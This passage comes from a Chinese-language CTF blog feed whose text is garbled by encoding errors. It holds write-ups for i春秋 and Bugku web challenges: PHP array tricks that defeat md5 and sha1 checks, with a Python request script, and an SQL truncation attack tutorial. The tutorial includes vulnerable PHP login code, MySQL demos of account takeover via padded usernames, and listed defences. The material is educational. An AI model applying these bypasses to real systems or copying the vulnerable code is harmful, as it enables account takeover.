è¿›åŽ»çš„valueä¸Žsessionä¸­çš„ç›¸ç­‰ï¼Œåˆ™ç½‘é¡µä¼šè¾“å‡ºä¸‹ä¸€ä¸ªvalueå€¼ï¼Œé€šè¿‡ä½¿ç”¨md5å‡½æ•°ä¸èƒ½å¯¹æ•°ç»„è¿›è¡Œå¤„ç†çš„æ¼æ´žæ¥ç»•è¿‡substr(md5($value),5,4)==0çš„åˆ¤æ–­ï¼Œä½¿numså¾—å€¼å¤§äºŽ10å³å¯å¾—åˆ°flagã€‚</p><pre><code>import requestsurl = "http://a75e0017fad4455c8c8e028b6e4ba9b71bdf7e5c484f4c43.changame.ichunqiu.com/?value[]=ea"al = ['abcdefghijklmnopqrstuvwxyz']s = requests.session()r=s.get(url)for i in range(20):    url = "http://a75e0017fad4455c8c8e028b6e4ba9b71bdf7e5c484f4c43.changame.ichunqiu.com/?value[]=" + r.content[0:2]    r=s.get(url)    print r.content</code></pre><p>æˆ–è€…ï¼š</p><p>?value[0]=e&amp;value[1]=a</p><p>ä¼šè¿”å›žä¸¤ä¸ªå­—ç¬¦ å‡è®¾æ˜¯bq   é‚£å°±  ?value[0]=b&amp;value[1]=q  ä»£ç ä¸»è¦æ˜¯è¦éªŒè¯è¿™ä¸¤ä¸ªå­—ç¬¦MD5çš„ç¬¬äº”è¿˜æ˜¯ç¬¬å…­ä½æ˜¯ä¸æ˜¯å­—ç¬¦ï¼ˆå¼±ç±»åž‹å¯ä»¥è¿‡â€==â€å·ï¼‰æˆ– 0ï¼Œå†™è„šæœ¬çš„è¯æ³¨æ„sessionå¼€å¯å’Œé‡ç½®</p>]]></content>
      
      
      
        <tags>
            
            <tag> iæ˜¥ç§‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web29-å„ç§ç»•è¿‡sha1</title>
      <link href="2021/04/05/bugku-web29-ge-chong-rao-guo-sha1/"/>
      <url>2021/04/05/bugku-web29-ge-chong-rao-guo-sha1/</url>
      
        <content type="html"><![CDATA[<h2 id="sha1ä¸ŽMD5åŒºåˆ«ï¼š"><a href="#sha1ä¸ŽMD5åŒºåˆ«ï¼š" class="headerlink" title="sha1ä¸ŽMD5åŒºåˆ«ï¼š"></a>sha1ä¸ŽMD5åŒºåˆ«ï¼š</h2><p>å®‰å…¨å“ˆå¸Œç®—æ³•ï¼ˆSecure Hash Algorithmï¼‰ä¸»è¦é€‚ç”¨äºŽæ•°å­—ç­¾åæ ‡å‡†ï¼ˆDigital Signature Standard  DSSï¼‰é‡Œé¢å®šä¹‰çš„æ•°å­—ç­¾åç®—æ³•ï¼ˆDigital Signature Algorithm  DSAï¼‰ã€‚å¯¹äºŽé•¿åº¦å°äºŽ2^64ä½çš„æ¶ˆæ¯ï¼ŒSHA1ä¼šäº§ç”Ÿä¸€ä¸ª160ä½çš„æ¶ˆæ¯æ‘˜è¦ã€‚è¯¥ç®—æ³•ç»è¿‡åŠ å¯†ä¸“å®¶å¤šå¹´æ¥çš„å‘å±•å’Œæ”¹è¿›å·²æ—¥ç›Šå®Œå–„ï¼Œå¹¶è¢«å¹¿æ³›ä½¿ç”¨ã€‚è¯¥ç®—æ³•çš„æ€æƒ³æ˜¯æŽ¥æ”¶ä¸€æ®µæ˜Žæ–‡ï¼Œç„¶åŽä»¥ä¸€ç§ä¸å¯é€†çš„æ–¹å¼å°†å®ƒè½¬æ¢æˆä¸€æ®µï¼ˆé€šå¸¸æ›´å°ï¼‰å¯†æ–‡ï¼Œä¹Ÿå¯ä»¥ç®€å•çš„ç†è§£ä¸ºå–ä¸€ä¸²è¾“å…¥ç ï¼ˆç§°ä¸ºé¢„æ˜ å°„æˆ–ä¿¡æ¯ï¼‰ï¼Œå¹¶æŠŠå®ƒä»¬è½¬åŒ–ä¸ºé•¿åº¦è¾ƒçŸ­ã€ä½æ•°å›ºå®šçš„è¾“å‡ºåºåˆ—å³æ•£åˆ—å€¼ï¼ˆä¹Ÿç§°ä¸ºä¿¡æ¯æ‘˜è¦æˆ–ä¿¡æ¯è®¤è¯ä»£ç ï¼‰çš„è¿‡ç¨‹ã€‚æ•£åˆ—å‡½æ•°å€¼å¯ä»¥è¯´æ˜¯å¯¹æ˜Žæ–‡çš„ä¸€ç§â€œæŒ‡çº¹â€æˆ–æ˜¯â€œæ‘˜è¦â€æ‰€ä»¥å¯¹æ•£åˆ—å€¼çš„æ•°å­—ç­¾åå°±å¯ä»¥è§†ä¸ºå¯¹æ­¤æ˜Žæ–‡çš„æ•°å­—ç­¾åã€‚å•å‘æ•£åˆ—å‡½æ•°çš„å®‰å…¨æ€§åœ¨äºŽå…¶äº§ç”Ÿæ•£åˆ—å€¼çš„æ“ä½œè¿‡ç¨‹å…·æœ‰è¾ƒå¼ºçš„å•å‘æ€§ã€‚å¦‚æžœåœ¨è¾“å…¥åºåˆ—ä¸­åµŒå…¥å¯†ç ï¼Œé‚£ä¹ˆä»»ä½•äººåœ¨ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹éƒ½ä¸èƒ½äº§ç”Ÿæ­£ç¡®çš„æ•£åˆ—å€¼ï¼Œä»Žè€Œä¿è¯äº†å…¶å®‰å…¨æ€§ã€‚SHAå°†è¾“å…¥æµæŒ‰ç…§æ¯å—512ä½ï¼ˆ64ä¸ªå­—èŠ‚ï¼‰è¿›è¡Œåˆ†å—ï¼Œå¹¶äº§ç”Ÿ20ä¸ªå­—èŠ‚çš„è¢«ç§°ä¸ºä¿¡æ¯è®¤è¯ä»£ç æˆ–ä¿¡æ¯æ‘˜è¦çš„è¾“å‡ºã€‚<br> è¯¥ç®—æ³•è¾“å…¥æŠ¥æ–‡çš„é•¿åº¦ä¸é™ï¼Œäº§ç”Ÿçš„è¾“å‡ºæ˜¯ä¸€ä¸ª160ä½çš„æŠ¥æ–‡æ‘˜è¦ã€‚è¾“å…¥æ˜¯æŒ‰512 ä½çš„åˆ†ç»„è¿›è¡Œå¤„ç†çš„ã€‚SHA-1æ˜¯ä¸å¯é€†çš„ã€é˜²å†²çªï¼Œå¹¶å…·æœ‰è‰¯å¥½çš„é›ªå´©æ•ˆåº”ã€‚<br>  é€šè¿‡æ•£åˆ—ç®—æ³•å¯å®žçŽ°æ•°å­—ç­¾åå®žçŽ°ï¼Œæ•°å­—ç­¾åçš„åŽŸç†æ˜¯å°†è¦ä¼ é€çš„æ˜Žæ–‡é€šè¿‡ä¸€ç§å‡½æ•°è¿ç®—ï¼ˆHashï¼‰è½¬æ¢æˆæŠ¥æ–‡æ‘˜è¦ï¼ˆä¸åŒçš„æ˜Žæ–‡å¯¹åº”ä¸åŒçš„æŠ¥æ–‡æ‘˜è¦ï¼‰ï¼ŒæŠ¥æ–‡æ‘˜è¦åŠ å¯†åŽä¸Žæ˜Žæ–‡ä¸€èµ·ä¼ é€ç»™æŽ¥å—æ–¹ï¼ŒæŽ¥å—æ–¹å°†æŽ¥å—çš„æ˜Žæ–‡äº§ç”Ÿæ–°çš„æŠ¥æ–‡æ‘˜è¦ä¸Žå‘é€æ–¹çš„å‘æ¥æŠ¥æ–‡æ‘˜è¦è§£å¯†æ¯”è¾ƒï¼Œæ¯”è¾ƒç»“æžœä¸€è‡´è¡¨ç¤ºæ˜Žæ–‡æœªè¢«æ”¹åŠ¨ï¼Œå¦‚æžœä¸ä¸€è‡´è¡¨ç¤ºæ˜Žæ–‡å·²è¢«ç¯¡æ”¹ã€‚<br> MAC ï¼ˆä¿¡æ¯è®¤è¯ä»£ç ï¼‰å°±æ˜¯ä¸€ä¸ªæ•£åˆ—ç»“æžœï¼Œå…¶ä¸­éƒ¨åˆ†è¾“å…¥ä¿¡æ¯æ˜¯å¯†ç ï¼Œåªæœ‰çŸ¥é“è¿™ä¸ªå¯†ç çš„å‚ä¸Žè€…æ‰èƒ½å†æ¬¡è®¡ç®—å’ŒéªŒè¯MACç çš„åˆæ³•æ€§ã€‚</p><p>SHA-1ä¸ŽMD5çš„æ¯”è¾ƒ<br> å› ä¸ºäºŒè€…å‡ç”±MD4å¯¼å‡ºï¼ŒSHA-1å’ŒMD5å½¼æ­¤å¾ˆç›¸ä¼¼ã€‚ç›¸åº”çš„ï¼Œä»–ä»¬çš„å¼ºåº¦å’Œå…¶ä»–ç‰¹æ€§ä¹Ÿæ˜¯ç›¸ä¼¼ï¼Œä½†è¿˜æœ‰ä»¥ä¸‹å‡ ç‚¹ä¸åŒï¼š<br> l å¯¹å¼ºè¡Œæ”»å‡»çš„å®‰å…¨æ€§ï¼šæœ€æ˜¾è‘—å’Œæœ€é‡è¦çš„åŒºåˆ«æ˜¯SHA-1æ‘˜è¦æ¯”MD5æ‘˜è¦é•¿32 ä½ã€‚ä½¿ç”¨å¼ºè¡ŒæŠ€æœ¯ï¼Œäº§ç”Ÿä»»ä½•ä¸€ä¸ªæŠ¥æ–‡ä½¿å…¶æ‘˜è¦ç­‰äºŽç»™å®šæŠ¥æ‘˜è¦çš„éš¾åº¦å¯¹MD5æ˜¯2128æ•°é‡çº§çš„æ“ä½œï¼Œè€Œå¯¹SHA-1åˆ™æ˜¯2160æ•°é‡çº§çš„æ“ä½œã€‚è¿™æ ·ï¼ŒSHA-1å¯¹å¼ºè¡Œæ”»å‡»æœ‰æ›´å¤§çš„å¼ºåº¦ã€‚<br> l å¯¹å¯†ç åˆ†æžçš„å®‰å…¨æ€§ï¼šç”±äºŽMD5çš„è®¾è®¡ï¼Œæ˜“å—å¯†ç åˆ†æžçš„æ”»å‡»ï¼ŒSHA-1æ˜¾å¾—ä¸æ˜“å—è¿™æ ·çš„æ”»å‡»ã€‚<br> l é€Ÿåº¦ï¼šåœ¨ç›¸åŒçš„ç¡¬ä»¶ä¸Šï¼ŒSHA-1çš„è¿è¡Œé€Ÿåº¦æ¯”MD5æ…¢ã€‚</p><h2 id="Web29"><a href="#Web29" class="headerlink" title="Web29"></a>Web29</h2><p><img src="/2021/04/05/bugku-web29-ge-chong-rao-guo-sha1/blog/source_posts\Bugkuï¼šWeb29-å„ç§ç»•è¿‡sha1\æºä»£ç .png" alt="æºä»£ç "></p><p>åªè¦ä½¿unameçš„sha1å’Œå€¼ä¸Žpasswdçš„sha1çš„å€¼ç›¸ç­‰å³å¯ï¼Œä½†æ˜¯åŒæ—¶ä»–ä»¬ä¸¤ä¸ªçš„å€¼åˆä¸èƒ½ç›¸ç­‰</p><p>é‡‡ç”¨hackbarï¼š</p><pre><code>?uname[]=1&amp;id=marginpostä¼ å€¼ï¼špasswd[]=2</code></pre><p><img src="/2021/04/05/bugku-web29-ge-chong-rao-guo-sha1/blog/source_posts\Bugkuï¼šWeb29-å„ç§ç»•è¿‡sha1\hackbar.png" alt="hackbar"></p><pre><code>flag{54f06835d645ab639ceb99e48a1a86da}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP:æ”¯æŒçš„åè®®å’Œå°è£…åè®®</title>
      <link href="2021/04/05/php-zhi-chi-de-xie-yi-he-feng-zhuang-xie-yi/"/>
      <url>2021/04/05/php-zhi-chi-de-xie-yi-he-feng-zhuang-xie-yi/</url>
      
        <content type="html"><![CDATA[<p>   PHP å¸¦æœ‰å¾ˆå¤šå†…ç½® URL é£Žæ ¼çš„å°è£…åè®®ï¼Œå¯ç”¨äºŽç±»ä¼¼ <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a>ã€   <a href="https://www.php.net/manual/zh/function.copy.php">copy()</a>ã€ <a href="https://www.php.net/manual/zh/function.file-exists.php">file_exists()</a> å’Œ   <a href="https://www.php.net/manual/zh/function.filesize.php">filesize()</a> çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°ã€‚   é™¤äº†è¿™äº›å°è£…åè®®ï¼Œè¿˜èƒ½é€šè¿‡ <a href="https://www.php.net/manual/zh/function.stream-wrapper-register.php">stream_wrapper_register()</a> æ¥æ³¨å†Œè‡ªå®šä¹‰çš„å°è£…åè®®ã€‚  </p><blockquote><h4 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„:"></a><strong>æ³¨æ„</strong>:</h4><pre><code>ç”¨äºŽæè¿°ä¸€ä¸ªå°è£…åè®®çš„ URL è¯­æ³•ä»…æ”¯æŒ `scheme://...` çš„è¯­æ³•ã€‚    `scheme:/`    å’Œ `scheme:` è¯­æ³•æ˜¯ä¸æ”¯æŒçš„ã€‚</code></pre></blockquote><ul><li><a href="https://www.php.net/manual/zh/wrappers.file.php">file://</a> â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</li><li><a href="https://www.php.net/manual/zh/wrappers.http.php">http://</a> â€” è®¿é—® HTTP(s) ç½‘å€</li><li><a href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> â€” è®¿é—® FTP(s) URLs</li><li><a href="https://www.php.net/manual/zh/wrappers.php.php">php://</a> â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰</li><li><a href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> â€” åŽ‹ç¼©æµ</li><li><a href="https://www.php.net/manual/zh/wrappers.data.php">data://</a> â€” æ•°æ®ï¼ˆRFC 2397ï¼‰</li><li><a href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a> â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</li><li><a href="https://www.php.net/manual/zh/wrappers.phar.php">phar://</a> â€” PHP å½’æ¡£</li><li><a href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2://</a> â€” Secure Shell 2</li><li><a href="https://www.php.net/manual/zh/wrappers.rar.php">rar://</a> â€” RAR</li><li><a href="https://www.php.net/manual/zh/wrappers.audio.php">ogg://</a> â€” éŸ³é¢‘æµ</li><li><a href="https://www.php.net/manual/zh/wrappers.expect.php">expect://</a> â€” å¤„ç†äº¤äº’å¼çš„æµ</li></ul><p>å‚è€ƒï¼š<a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web25-SQLçº¦æŸæ”»å‡»</title>
      <link href="2021/04/04/bugku-web25-sql-yue-shu-gong-ji/"/>
      <url>2021/04/04/bugku-web25-sql-yue-shu-gong-ji/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/04/04/bugku-web25-sql-yue-shu-gong-ji/blog/source_posts\Bugkuï¼šweb25-SQLçº¦æŸæ”»å‡»\admin.png" alt="admin"></p><p>ç”¨admin                                                  1</p><p>ä»»æ„å¯†ç ç»•è¿‡æ³¨é‡Šâ€˜</p><p>ç™»å½•ç•Œé¢adminå’Œå‰é¢æ³¨å†Œç”¨çš„å¯†ç å¾—åˆ°flag</p><p>åŽŸå› ç©ºæ ¼æˆªæ–­å³é•¿åº¦é™åˆ¶</p><p><img src="/2021/04/04/bugku-web25-sql-yue-shu-gong-ji/blog/source_posts\Bugkuï¼šweb25-SQLçº¦æŸæ”»å‡»\flag.png" alt="flag"></p><p><img src="/2021/04/04/bugku-web25-sql-yue-shu-gong-ji/blog/source_posts\Bugkuï¼šweb25-SQLçº¦æŸæ”»å‡»\flag.png" alt="flag"></p><h2 id="é˜²æŠ¤"><a href="#é˜²æŠ¤" class="headerlink" title="é˜²æŠ¤:"></a>é˜²æŠ¤:</h2><p>æ¯«æ— ç–‘é—®ï¼Œåœ¨è¿›è¡Œè½¯ä»¶å¼€å‘æ—¶ï¼Œéœ€è¦å¯¹æ­¤ç±»å®‰å…¨æ¼æ´žå¼•èµ·æ³¨æ„ã€‚æˆ‘ä»¬å¯é‡‡å–ä»¥ä¸‹å‡ é¡¹æŽªæ–½è¿›è¡Œé˜²å¾¡ï¼š</p><ol><li>å°†è¦æ±‚æˆ–è€…é¢„æœŸå…·æœ‰å”¯ä¸€æ€§çš„é‚£äº›åˆ—åŠ ä¸ŠUNIQUEçº¦æŸã€‚å®žé™…ä¸Šè¿™æ˜¯ä¸€ä¸ªæ¶‰åŠè½¯ä»¶å¼€å‘çš„é‡è¦è§„åˆ™ï¼Œå³ä½¿ä½ çš„ä»£ç æœ‰ç»´æŒå…¶å®Œæ•´æ€§çš„åŠŸèƒ½ï¼Œä¹Ÿåº”è¯¥æ°å½“çš„å®šä¹‰æ•°æ®ã€‚ç”±äºŽâ€™usernameâ€™åˆ—å…·æœ‰UNIQUEçº¦æŸï¼Œæ‰€ä»¥ä¸èƒ½æ’å…¥å¦ä¸€æ¡è®°å½•ã€‚å°†ä¼šæ£€æµ‹åˆ°ä¸¤ä¸ªç›¸åŒçš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”INSERTæŸ¥è¯¢å°†å¤±è´¥ã€‚</li><li>æœ€å¥½ä½¿ç”¨â€™idâ€™ä½œä¸ºæ•°æ®åº“è¡¨çš„ä¸»é”®ã€‚å¹¶ä¸”æ•°æ®åº”è¯¥é€šè¿‡ç¨‹åºä¸­çš„idè¿›è¡Œè·Ÿè¸ª</li><li>ä¸ºäº†æ›´åŠ å®‰å…¨ï¼Œè¿˜å¯ä»¥ç”¨æ‰‹åŠ¨è°ƒæ•´è¾“å…¥å‚æ•°çš„é™åˆ¶é•¿åº¦ï¼ˆä¾ç…§æ•°æ®åº“è®¾ç½®ï¼‰</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL:çº¦æŸæ”»å‡»</title>
      <link href="2021/04/04/sql-yue-shu-gong-ji/"/>
      <url>2021/04/04/sql-yue-shu-gong-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºäºŽçº¦æŸçš„SQLæ”»å‡»"><a href="#åŸºäºŽçº¦æŸçš„SQLæ”»å‡»" class="headerlink" title="åŸºäºŽçº¦æŸçš„SQLæ”»å‡»"></a>åŸºäºŽçº¦æŸçš„SQLæ”»å‡»</h2><h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><blockquote><p>å€¼å¾—åº†å¹¸çš„æ˜¯å¦‚ä»Šå¼€å‘è€…åœ¨æž„å»ºç½‘ç«™æ—¶ï¼Œå·²ç»å¼€å§‹æ³¨é‡å®‰å…¨é—®é¢˜äº†ã€‚ç»å¤§éƒ¨åˆ†å¼€å‘è€…éƒ½æ„è¯†åˆ°SQLæ³¨å…¥æ¼æ´žçš„å­˜åœ¨ï¼Œåœ¨æœ¬æ–‡æˆ‘æƒ³ä¸Žè¯»è€…å…±åŒåŽ»æŽ¢è®¨å¦ä¸€ç§ä¸ŽSQLæ•°æ®åº“ç›¸å…³çš„æ¼æ´žï¼Œå…¶å±å®³ä¸ŽSQLæ³¨å…¥ä¸ç›¸ä¸Šä¸‹ï¼Œä½†å´ä¸å¤ªå¸¸è§ã€‚æŽ¥ä¸‹æ¥ï¼Œæˆ‘å°†ä¸ºè¯»è€…è¯¦ç»†å±•ç¤ºè¿™ç§æ”»å‡»æ‰‹æ³•ï¼Œä»¥åŠç›¸åº”çš„é˜²å¾¡ç­–ç•¥ã€‚</p></blockquote><p>æ³¨æ„ï¼šæœ¬æ–‡ä¸æ˜¯è®²è¿°SQLæ³¨å…¥æ”»å‡»</p><h4 id="èƒŒæ™¯ä»‹ç»"><a href="#èƒŒæ™¯ä»‹ç»" class="headerlink" title="èƒŒæ™¯ä»‹ç»"></a>èƒŒæ™¯ä»‹ç»</h4><p>æœ€è¿‘ï¼Œæˆ‘é‡åˆ°äº†ä¸€ä¸ªæœ‰è¶£çš„ä»£ç ç‰‡æ®µï¼Œå¼€å‘è€…å°è¯•å„ç§æ–¹æ³•æ¥ç¡®ä¿æ•°æ®åº“çš„å®‰å…¨è®¿é—®ã€‚å½“æ–°ç”¨æˆ·å°è¯•æ³¨å†Œæ—¶ï¼Œå°†è¿è¡Œä»¥ä¸‹ä»£ç ï¼š</p><pre><code>&lt;?php// Checking whether a user with the same username exists$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = "SELECT *          FROM users          WHERE username='$username'";$res = mysql_query($query, $database);if($res) {  if(mysql_num_rows($res) &gt; 0) {    // User exists, exit gracefully    .    .  }  else {    // If not, only then insert a new entry    $query = "INSERT INTO users(username, password)              VALUES ('$username','$password')";    .    .  }}</code></pre><p>ä½¿ç”¨ä»¥ä¸‹ä»£ç éªŒè¯ç™»å½•ä¿¡æ¯ï¼š</p><pre><code>&lt;?php$username = mysql_real_escape_string($_GET['username']);$password = mysql_real_escape_string($_GET['password']);$query = "SELECT username FROM users          WHERE username='$username'              AND password='$password' ";$res = mysql_query($query, $database);if($res) {  if(mysql_num_rows($res) &gt; 0){      $row = mysql_fetch_assoc($res);      return $row['username'];  }}return Null;</code></pre><p>å®‰å…¨è€ƒè™‘:</p><blockquote><ul><li>è¿‡æ»¤ç”¨æˆ·è¾“å…¥å‚æ•°äº†å—ï¼Ÿ â€“ å®Œæˆæ£€æŸ¥</li><li>ä½¿ç”¨å•å¼•å·ï¼ˆâ€™ï¼‰æ¥å¢žåŠ å®‰å…¨æ€§äº†å—ï¼Ÿ â€“ å®Œæˆæ£€æŸ¥</li></ul></blockquote><p>æŒ‰ç†è¯´åº”è¯¥ä¸ä¼šå‡ºé”™äº†å•Šï¼Ÿ</p><p>ç„¶è€Œï¼Œæ”»å‡»è€…ä¾ç„¶èƒ½å¤Ÿä»¥ä»»æ„ç”¨æˆ·èº«ä»½è¿›è¡Œç™»å½•ï¼</p><h4 id="æ”»å‡»æ‰‹æ³•"><a href="#æ”»å‡»æ‰‹æ³•" class="headerlink" title="æ”»å‡»æ‰‹æ³•"></a>æ”»å‡»æ‰‹æ³•</h4><p>åœ¨è°ˆè®ºè¿™ç§æ”»å‡»æ‰‹æ³•ä¹‹å‰ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦äº†è§£å‡ ä¸ªå…³é”®çŸ¥è¯†ç‚¹ã€‚</p><ol><li><p>åœ¨SQLä¸­æ‰§è¡Œå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ç¬¦å°†ä¼šè¢«åˆ é™¤ã€‚æ¢å¥è¯è¯´â€œvampireâ€ç­‰åŒäºŽâ€œvampire  â€ï¼Œå¯¹äºŽç»å¤§å¤šæ•°æƒ…å†µæ¥è¯´éƒ½æ˜¯æˆç«‹çš„ï¼ˆè¯¸å¦‚WHEREå­å¥ä¸­çš„å­—ç¬¦ä¸²æˆ–INSERTè¯­å¥ä¸­çš„å­—ç¬¦ä¸²ï¼‰ä¾‹å¦‚ä»¥ä¸‹è¯­å¥çš„æŸ¥è¯¢ç»“æžœï¼Œä¸Žä½¿ç”¨ç”¨æˆ·åâ€œvampireâ€è¿›è¡ŒæŸ¥è¯¢æ—¶çš„ç»“æžœæ˜¯ä¸€æ ·çš„ã€‚</p><pre><code>SELECT * FROM users WHERE username='vampire     ';</code></pre><p>ä½†ä¹Ÿå­˜åœ¨å¼‚å¸¸æƒ…å†µï¼Œæœ€å¥½çš„ä¾‹å­å°±æ˜¯LIKEå­å¥äº†ã€‚æ³¨æ„ï¼Œå¯¹å°¾éƒ¨ç©ºç™½ç¬¦çš„è¿™ç§ä¿®å‰ªæ“ä½œï¼Œä¸»è¦æ˜¯åœ¨â€œå­—ç¬¦ä¸²æ¯”è¾ƒâ€æœŸé—´è¿›è¡Œçš„ã€‚è¿™æ˜¯å› ä¸ºï¼ŒSQLä¼šåœ¨<a href="https://support.microsoft.com/en-in/kb/316626">å†…éƒ¨</a>ä½¿ç”¨ç©ºæ ¼æ¥å¡«å……å­—ç¬¦ä¸²ï¼Œä»¥ä¾¿åœ¨æ¯”è¾ƒä¹‹å‰ä½¿å…¶å®ƒä»¬çš„é•¿åº¦ä¿æŒä¸€è‡´ã€‚</p></li><li><p>åœ¨æ‰€æœ‰çš„INSERTæŸ¥è¯¢ä¸­ï¼ŒSQLéƒ½ä¼šæ ¹æ®varchar(n)æ¥é™åˆ¶å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æžœå­—ç¬¦ä¸²çš„é•¿åº¦å¤§äºŽâ€œnâ€ä¸ªå­—ç¬¦çš„è¯ï¼Œé‚£ä¹ˆä»…ä½¿ç”¨å­—ç¬¦ä¸²çš„å‰â€œnâ€ä¸ªå­—ç¬¦ã€‚æ¯”å¦‚ç‰¹å®šåˆ—çš„é•¿åº¦çº¦æŸä¸ºâ€œ5â€ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆåœ¨æ’å…¥å­—ç¬¦ä¸²â€œvampireâ€æ—¶ï¼Œå®žé™…ä¸Šåªèƒ½æ’å…¥å­—ç¬¦ä¸²çš„å‰5ä¸ªå­—ç¬¦ï¼Œå³â€œvampiâ€ã€‚</p></li></ol><p>çŽ°åœ¨ï¼Œè®©æˆ‘ä»¬å»ºç«‹ä¸€ä¸ªæµ‹è¯•æ•°æ®åº“æ¥æ¼”ç¤ºå…·ä½“æ”»å‡»è¿‡ç¨‹ã€‚</p><pre><code>vampire@linux:~$ mysql -u root -pmysql&gt; CREATE DATABASE testing;Query OK, 1 row affected (0.03 sec)mysql&gt; USE testing;Database changed</code></pre><p>æŽ¥ç€åˆ›å»ºä¸€ä¸ªæ•°æ®è¡¨usersï¼Œå…¶åŒ…å«usernameå’Œpasswordåˆ—ï¼Œå¹¶ä¸”å­—æ®µçš„æœ€å¤§é•¿åº¦é™åˆ¶ä¸º25ä¸ªå­—ç¬¦ã€‚ç„¶åŽï¼Œæˆ‘å°†å‘usernameå­—æ®µæ’å…¥â€œvampireâ€ï¼Œå‘passwordå­—æ®µæ’å…¥â€œmy_passwordâ€ã€‚</p><pre><code>mysql&gt; CREATE TABLE users (    -&gt;   username varchar(25),    -&gt;   password varchar(25)    -&gt; );Query OK, 0 rows affected (0.09 sec)mysql&gt; INSERT INTO users    -&gt; VALUES('vampire', 'my_password');Query OK, 1 row affected (0.11 sec)mysql&gt; SELECT * FROM users;+----------+-------------+| username | password    |+----------+-------------+| vampire  | my_password |+----------+-------------+1 row in set (0.00 sec)</code></pre><p>ä¸ºäº†å±•ç¤ºå°¾éƒ¨ç©ºç™½å­—ç¬¦çš„ä¿®å‰ªæƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥é”®å…¥ä¸‹åˆ—å‘½ä»¤ï¼š</p><pre><code>mysql&gt; SELECT * FROM users    -&gt; WHERE username='vampire       ';+----------+-------------+| username | password    |+----------+-------------+| vampire  | my_password |+----------+-------------+1 row in set (0.00 sec)</code></pre><p>çŽ°åœ¨æˆ‘ä»¬å‡è®¾ä¸€ä¸ªå­˜åœ¨æ¼æ´žçš„ç½‘ç«™ä½¿ç”¨äº†å‰é¢æåˆ°çš„PHPä»£ç æ¥å¤„ç†ç”¨æˆ·çš„æ³¨å†ŒåŠç™»å½•è¿‡ç¨‹ã€‚ä¸ºäº†ä¾µå…¥ä»»æ„ç”¨æˆ·çš„å¸æˆ·ï¼ˆåœ¨æœ¬ä¾‹ä¸­ä¸ºâ€œvampireâ€ï¼‰ï¼Œåªéœ€è¦ä½¿ç”¨ç”¨æˆ·åâ€œvampire[è®¸å¤šç©ºç™½ç¬¦]1â€å’Œä¸€ä¸ªéšæœºå¯†ç è¿›è¡Œæ³¨å†Œå³å¯ã€‚å¯¹äºŽé€‰æ‹©çš„ç”¨æˆ·åï¼Œå‰25ä¸ªå­—ç¬¦åº”è¯¥åªåŒ…å«vampireå’Œç©ºç™½å­—ç¬¦ï¼Œè¿™æ ·åšå°†æœ‰åŠ©äºŽç»•è¿‡æ£€æŸ¥ç‰¹å®šç”¨æˆ·åæ˜¯å¦å·²å­˜åœ¨çš„æŸ¥è¯¢ã€‚</p><pre><code>mysql&gt; SELECT * FROM users    -&gt; WHERE username='vampire                   1';Empty set (0.00 sec)</code></pre><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨æ‰§è¡ŒSELECTæŸ¥è¯¢è¯­å¥æ—¶ï¼ŒSQLæ˜¯ä¸ä¼šå°†å­—ç¬¦ä¸²ç¼©çŸ­ä¸º25ä¸ªå­—ç¬¦çš„ã€‚å› æ­¤ï¼Œè¿™é‡Œå°†ä½¿ç”¨å®Œæ•´çš„å­—ç¬¦ä¸²è¿›è¡Œæœç´¢ï¼Œæ‰€ä»¥ä¸ä¼šæ‰¾åˆ°åŒ¹é…çš„ç»“æžœã€‚æŽ¥ä¸‹æ¥ï¼Œå½“æ‰§è¡ŒINSERTæŸ¥è¯¢è¯­å¥æ—¶ï¼Œå®ƒåªä¼šæ’å…¥å‰25ä¸ªå­—ç¬¦ã€‚</p><pre><code>mysql&gt;   INSERT INTO users(username, password)    -&gt; VALUES ('vampire                   1', 'random_pass');Query OK, 1 row affected, 1 warning (0.05 sec)mysql&gt; SELECT * FROM users    -&gt; WHERE username='vampire';+---------------------------+-------------+| username                  | password    |+---------------------------+-------------+| vampire                   | my_password || vampire                   | random_pass |+---------------------------+-------------+2 rows in set (0.00 sec)</code></pre><p>å¾ˆå¥½ï¼ŒçŽ°åœ¨æˆ‘ä»¬æ£€ç´¢â€œvampireâ€çš„ï¼Œå°†è¿”å›žä¸¤ä¸ªç‹¬ç«‹ç”¨æˆ·ã€‚æ³¨æ„ï¼Œç¬¬äºŒä¸ªç”¨æˆ·åå®žé™…ä¸Šæ˜¯â€œvampireâ€åŠ ä¸Šå°¾éƒ¨çš„18ä¸ªç©ºæ 